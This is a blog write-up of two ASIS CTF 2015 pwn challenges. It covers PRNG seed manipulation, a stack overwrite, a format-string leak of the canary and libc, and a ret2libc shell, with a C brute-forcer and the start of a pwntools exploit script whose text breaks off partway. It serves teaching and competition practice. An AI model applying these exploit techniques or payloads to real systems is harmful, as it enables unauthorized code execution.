<!DOCTYPE html>



<html lang="zh-TW" 
  
    mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="ASIS CTF 2015 Quals – Saw this (1 &amp; 2)" />
<meta property="og:locale" content="zh_TW" />
<meta name="description" content="Category: pwn Points: 100 (Saw this-1), 400 (Saw this-2)" />
<meta property="og:description" content="Category: pwn Points: 100 (Saw this-1), 400 (Saw this-2)" />
<link rel="canonical" href="http://0.0.0.0:4000/asis-ctf-2015-quals-saw-this-1/" />
<meta property="og:url" content="http://0.0.0.0:4000/asis-ctf-2015-quals-saw-this-1/" />
<meta property="og:site_name" content="Hacking Tube 2.0" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2015-05-23T06:37:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="ASIS CTF 2015 Quals – Saw this (1 &amp; 2)" />
<meta name="twitter:site" content="@bruce30262" />
<script type="application/ld+json">
{"url":"http://0.0.0.0:4000/asis-ctf-2015-quals-saw-this-1/","headline":"ASIS CTF 2015 Quals – Saw this (1 &amp; 2)","dateModified":"2020-03-21T17:09:40+08:00","datePublished":"2015-05-23T06:37:00+08:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/asis-ctf-2015-quals-saw-this-1/"},"description":"Category: pwn Points: 100 (Saw this-1), 400 (Saw this-2)","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>ASIS CTF 2015 Quals -- Saw this (1 & 2) | Hacking Tube 2.0
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Hacking Tube 2.0">
<meta name="application-name" content="Hacking Tube 2.0">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScripts -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  



  <!-- image lazy-loading & popup -->
  <script async
    src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>






</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/images/other/gravatar.png" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">Hacking Tube 2.0</a>
    </div>

    <div class="site-subtitle font-italic">Security and stuff</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/bruce30262" aria-label="github"
        
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/bruce30262" aria-label="twitter"
        
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['bruce30262','pm.me'].join('@')" aria-label="email"
        
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
          <span>ASIS CTF 2015 Quals -- Saw this (1 & 2)</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->




<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>ASIS CTF 2015 Quals -- Saw this (1 & 2)</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Bruce Chen
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Sat, May 23, 2015,  6:37 AM +0800"
  

  
  prep="on" >

  
  

  
    May 23, 2015
  

  <i class="unloaded">2015-05-23T06:37:00+08:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          
          <span>
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago lastmod"
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Sat, Mar 21, 2020,  5:09 PM +0800"
  

  prefix="Updated "
   >

  
  

  
    Mar 21, 2020
  

  <i class="unloaded">2020-03-21T17:09:40+08:00</i>

</span>

          </span>
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2420 words">13 min</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <p><strong>Category:</strong> pwn<br />
<strong>Points:</strong> 100 (Saw this-1), 400 (Saw this-2)</p>

<blockquote>
  <p>Survive and get the flag!<br />
Note: This challenge contains two flags, one of them is easier to fetch, the other is harder. <br />
The easier flag will be clearly indicated as “Flag 1”, the harder flag as “Flag 2”<br />
nc 87.107.123.3 31337</p>
</blockquote>

<!-- more -->

<p>64 bit ELF. Lauch it with the almighty IDA Pro and press the powerful F5 key, we’ll find that the service first ask us to input our user name and a lucky number. Then, it will use <code class="language-plaintext highlighter-rouge">srand</code> to set up the random number seed, and generate a random number sequence.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="rouge-code"><pre> <span class="n">srand</span><span class="p">(</span><span class="n">seed</span> <span class="o">+</span> <span class="n">lucky_number</span><span class="p">);</span>
 <span class="n">v10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 <span class="n">format</span> <span class="o">=</span> <span class="s">"YOU LOST THE GAME! IT'S OVER!"</span><span class="p">;</span>
 <span class="n">v8</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">floor</span><span class="p">(</span><span class="n">gen_rand_double</span><span class="p">()</span> <span class="o">*</span> <span class="mi">13</span><span class="p">.</span><span class="mi">0</span> <span class="o">+</span> <span class="mi">4</span><span class="p">.</span><span class="mi">0</span><span class="p">);</span>
 <span class="n">printf</span><span class="p">(</span><span class="s">"I've thought of %d numbers. If you guess them correctly, you are free!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v8</span><span class="p">);</span>
 
 <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">v8</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
    <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">floor</span><span class="p">(</span><span class="n">gen_rand_double</span><span class="p">()</span> <span class="o">*</span> <span class="mi">256</span><span class="p">.</span><span class="mi">0</span><span class="p">);</span>
    
 <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">v8</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
 <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Number #%d: "</span><span class="p">,</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">v7</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">read_lucky_number</span><span class="p">();</span>
    <span class="n">v5</span> <span class="o">=</span> <span class="n">memcmp</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">v7</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v10</span> <span class="o">&amp;&amp;</span> <span class="n">v5</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v10</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
      <span class="n">format</span> <span class="o">=</span> <span class="s">"YOU WON! You are free now!"</span><span class="p">;</span>
    <span class="p">}</span>
 <span class="p">}</span>
 
 <span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span> <span class="n">v10</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 <span class="n">print_freedom</span><span class="p">();</span> <span class="c1">// get flag1</span>
 <span class="k">do</span>
 <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Do you want to play again (y/n)? "</span><span class="p">);</span>
    <span class="n">read_input</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v12</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v12</span> <span class="o">==</span> <span class="sc">'y'</span> <span class="o">||</span> <span class="n">v12</span> <span class="o">==</span> <span class="sc">'Y'</span> <span class="p">)</span>
      <span class="k">goto</span> <span class="n">LABEL_4</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="k">while</span> <span class="p">(</span> <span class="n">v12</span> <span class="o">!=</span> <span class="sc">'n'</span> <span class="o">&amp;&amp;</span> <span class="n">v12</span> <span class="o">!=</span> <span class="sc">'N'</span> <span class="p">);</span>
 <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>For <strong>Saw this-1</strong>, we’ll have to try to guess all the random numbers. By investigating the memory, we found that our <code class="language-plaintext highlighter-rouge">user_name</code> start from <code class="language-plaintext highlighter-rouge">0x603108</code>, and the <code class="language-plaintext highlighter-rouge">seed</code> variable’s at <code class="language-plaintext highlighter-rouge">0x603148</code>. Since it let us input at most 64 characters, we can leak the <code class="language-plaintext highlighter-rouge">seed</code> by input a <code class="language-plaintext highlighter-rouge">user_name</code> which length’s 64 characters long. After we leak the <code class="language-plaintext highlighter-rouge">seed</code>, we can enter a <code class="language-plaintext highlighter-rouge">lucky_number</code> which cause the line <code class="language-plaintext highlighter-rouge">srand(seed + lucky_number);</code> into <code class="language-plaintext highlighter-rouge">srand(0)</code>. This will cause the server always generate a same group of random numbers, and so we can easily beat the game and get the flag1.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre></td><td class="rouge-code"><pre>I've thought of 10 numbers. If you guess them correctly, you are free!
Number #1: 
[+] sending: 44
Number #2: 
[+] sending: 79
Number #3: 
[+] sending: 136
Number #4: 
[+] sending: 242
Number #5: 
[+] sending: 43
Number #6: 
[+] sending: 179
Number #7: 
[+] sending: 57
Number #8: 
[+] sending: 126
Number #9: 
[+] sending: 31
Number #10: 
[+] sending: 21
[*] Switching to interactive mode
YOU WON! You are free now!      _   _  _____ _ _____   _   _ _____ _____   _____ _   _ _____ _   _ 
     | | | ||  ___( )  ___| | \ | |  _  |_   _| |  ___| | | |  ___| \ | |
     | |_| || |__ |/\ `--.  |  \| | | | | | |   | |__ | | | | |__ |  \| |
     |  _  ||  __|   `--. \ | . ` | | | | | |   |  __|| | | |  __|| . ` |
     | | | || |___  /\__/ / | |\  \ \_/ / | |   | |___\ \_/ / |___| |\  |
     \_| |_/\____/  \____/  \_| \_/\___/  \_/   \____/ \___/\____/\_| \_/

.........[ascii art picture]......   

      _____ _   _   _____ _   _  _____  ______ _____ _____  _   _ _____ 
     |_   _| \ | | |_   _| | | ||  ___| | ___ \_   _|  __ \| | | |_   _|
       | | |  \| |   | | | |_| || |__   | |_/ / | | | |  \/| |_| | | |  
       | | | . ` |   | | |  _  ||  __|  |    /  | | | | __ |  _  | | |  
      _| |_| |\  |   | | | | | || |___  | |\ \ _| |_| |_\ \| | | | | |  
      \___/\_| \_/   \_/ \_| |_/\____/  \_| \_|\___/ \____/\_| |_/ \_/  
     
                  _____   ___   _____ _____ _      _____ 
                 /  __ \ / _ \ /  ___|_   _| |    |  ___|
                 | /  \// /_\ \\ `--.  | | | |    | |__  
                 | |    |  _  | `--. \ | | | |    |  __| 
                 | \__/\| | | |/\__/ / | | | |____| |___ 
                  \____/\_| |_/\____/  \_/ \_____/\____/ 



               Good job Mario, but your princess isn't here! 

                               Get a shell!


Flag 1: ASIS{109096cca8948d1cebee782a11d2472b}
</pre></td></tr></tbody></table></code></div></div>

<p>For <strong>Saw this-2</strong>, we’ll have to try to get a shell. The above pseudo code show us that there’s a <strong>format string vulnerability</strong> in the program. It seems that the <code class="language-plaintext highlighter-rouge">format</code> variable is hard-coded in the program, we can’t control it directly. But it’s on the stack, so if we can find a way to overwrite the <code class="language-plaintext highlighter-rouge">format</code> pointer, we’ll be able to trigger the format string vulnerability.</p>

<p>It seems our only chance is to control the content of <code class="language-plaintext highlighter-rouge">v7[j]</code>. If <code class="language-plaintext highlighter-rouge">j</code> is big enough, we’ll be able to overwrite all the vairables on the stack, <strong>even the return address</strong>. We found that <code class="language-plaintext highlighter-rouge">v8</code> (the variable holds the iteration number) is exactly at <code class="language-plaintext highlighter-rouge">v7[16]</code>. So we’ll have to try to make <code class="language-plaintext highlighter-rouge">v8</code> &gt;= 17, which is, making the return value of <code class="language-plaintext highlighter-rouge">(signed int)floor(gen_rand_double() * 13.0 + 4.0)</code> = 17.</p>

<p>For random numbers, the only variable we can control is <code class="language-plaintext highlighter-rouge">lucky_number</code>. We’ll have to find a proper number <code class="language-plaintext highlighter-rouge">N</code> = <code class="language-plaintext highlighter-rouge">seed</code> + <code class="language-plaintext highlighter-rouge">lucky_number</code>, and let <code class="language-plaintext highlighter-rouge">srand(N)</code> set the right random number seed so <code class="language-plaintext highlighter-rouge">(signed int)floor(gen_rand_double() * 13.0 + 4.0)</code> will be equal to 17. And so I wrote a C program to achieve the requirement:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;math.h&gt;
</span>
<span class="kt">char</span> <span class="n">statebuf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>

<span class="kt">double</span> <span class="nf">gen_rand_double</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="p">(</span><span class="kt">double</span><span class="p">)</span><span class="n">rand</span><span class="p">()</span><span class="o">/</span><span class="mi">2147483647</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">initstate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">statebuf</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">v8</span><span class="p">;</span>

    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span> <span class="n">i</span><span class="o">&lt;=</span> <span class="mh">0xFFFFFFFF</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">srand</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
        <span class="n">v8</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="n">gen_rand_double</span><span class="p">()</span> <span class="o">*</span> <span class="mi">13</span><span class="p">.</span><span class="mi">0</span> <span class="o">+</span> <span class="mi">4</span><span class="p">.</span><span class="mi">0</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">v8</span> <span class="o">==</span> <span class="mi">17</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">"found!!"</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"i: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"0x%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">2147483647</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"done"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</pre></td></tr></tbody></table></code></div></div>

<p>The line <code class="language-plaintext highlighter-rouge">initstate(0, statebuf, 8)</code> is required to get the correct number, since the original binary has the exact same line of code in the initial process. Finally, we get <code class="language-plaintext highlighter-rouge">N</code> = <code class="language-plaintext highlighter-rouge">0x0dbdbb1e</code></p>

<p>So now everytime we send a <code class="language-plaintext highlighter-rouge">lucky_number</code>, it has to be <code class="language-plaintext highlighter-rouge">0x0dbdbb1e</code> - <code class="language-plaintext highlighter-rouge">seed</code>. Since <code class="language-plaintext highlighter-rouge">v8</code> is set to 17 now, whenever we send the 17th number, <code class="language-plaintext highlighter-rouge">v8</code> will be modify to the number we send, which means we can control the iteration numbers, and so are the variables on the stack.</p>

<p>Here are some important variables we’ll have to modify (overwrite):</p>
<ol>
  <li><code class="language-plaintext highlighter-rouge">v8</code>. The iteration number</li>
  <li><code class="language-plaintext highlighter-rouge">v10</code>. Overwrite it to <strong>1</strong> so we won’t lose the game.</li>
  <li><code class="language-plaintext highlighter-rouge">format</code>. Modify the pointer to the <code class="language-plaintext highlighter-rouge">user_name</code> buffer’s address (<code class="language-plaintext highlighter-rouge">0x603108</code>). Now we can trigger the format string vulnerability.</li>
</ol>

<p>Notice that other important variables (ex.<code class="language-plaintext highlighter-rouge">luck_number</code>) will have to remain the same value after you overwrite the stack. As for the format string payload, at first I try to use <strong>%n</strong> to write the memory, until I found that the service <strong>won’t let us input our user name for second time</strong>. Since we can’t reuse the vulnerability, I decided to leak the <strong>stack canary</strong> and the <strong>return address</strong> ( which returns to <code class="language-plaintext highlighter-rouge">__libc_start_main</code> ).</p>

<p>Now we have the stack canary and the libc address. We can use the libc address to calculate the libc’s base address, and get the address of <code class="language-plaintext highlighter-rouge">system</code>, <code class="language-plaintext highlighter-rouge">pop rdi, ret</code> gadget and <code class="language-plaintext highlighter-rouge">/bin/sh</code> string pointer. After we have all the information, we can overwrite the stack canary and the return address to launch a return-2-libc attack.</p>

<p>To sum up, here’s the exploitation of Saw this-2:</p>
<ol>
  <li>Brute-Force the <code class="language-plaintext highlighter-rouge">srand</code> seed so <code class="language-plaintext highlighter-rouge">v8</code>(the iteration number) can be set to <code class="language-plaintext highlighter-rouge">17</code>.</li>
  <li>Overwrite <code class="language-plaintext highlighter-rouge">v7[16]</code> (=<code class="language-plaintext highlighter-rouge">v8</code>), so we can overwrite the variables on the stack.</li>
  <li>Overwrite <code class="language-plaintext highlighter-rouge">format</code> to the <code class="language-plaintext highlighter-rouge">user_name</code> buffer so we can trigger the format string vulnerability.</li>
  <li>Leak the stack canary &amp; return address.</li>
  <li>Use the return adress to calculate libc’s base address, so we can get <code class="language-plaintext highlighter-rouge">system</code>, <code class="language-plaintext highlighter-rouge">pop rdi, ret</code> &amp; <code class="language-plaintext highlighter-rouge">/bin/sh</code>’s address.</li>
  <li>Overwrite the stack canary &amp; return address to launch the return-2-libc attack.</li>
</ol>

<div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s">"87.107.123.3"</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">31337</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>

<span class="n">guess</span> <span class="o">=</span> <span class="p">[</span><span class="mi">124</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">77</span><span class="p">,</span><span class="o">-</span><span class="mi">48</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="o">-</span><span class="mi">36</span><span class="p">,</span><span class="mi">70</span><span class="p">,</span><span class="o">-</span><span class="mi">6</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="o">-</span><span class="mi">86</span><span class="p">,</span><span class="mi">66</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">77</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">53</span><span class="p">]</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="c1"># name buffer address = 0x603108
# %21$p -0xfd - 0x1edb0 = libc_base
# %17$p = canary
</span>
<span class="c1">#send name
</span><span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"call you? "</span><span class="p">)</span>
<span class="n">name</span> <span class="o">=</span> <span class="s">"%17$p.%21$p."</span>
<span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
<span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="s">"B"</span><span class="p">)</span>
<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="o">==</span> <span class="mi">64</span>
<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

<span class="c1"># exploit PRNG
</span><span class="n">s</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span> <span class="s">"s:"</span><span class="p">,</span> <span class="n">s</span>
<span class="n">seed</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">s</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="o">+</span><span class="mi">64</span><span class="p">:</span><span class="n">s</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="s">"!"</span><span class="p">):].</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"seed: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">seed</span><span class="p">))</span>
<span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"on it: "</span><span class="p">)</span>
<span class="n">lucky_number</span> <span class="o">=</span> <span class="mh">0x0dbdbb1e</span> <span class="o">-</span> <span class="n">seed</span>
<span class="n">lucky_hex</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">lucky_number</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
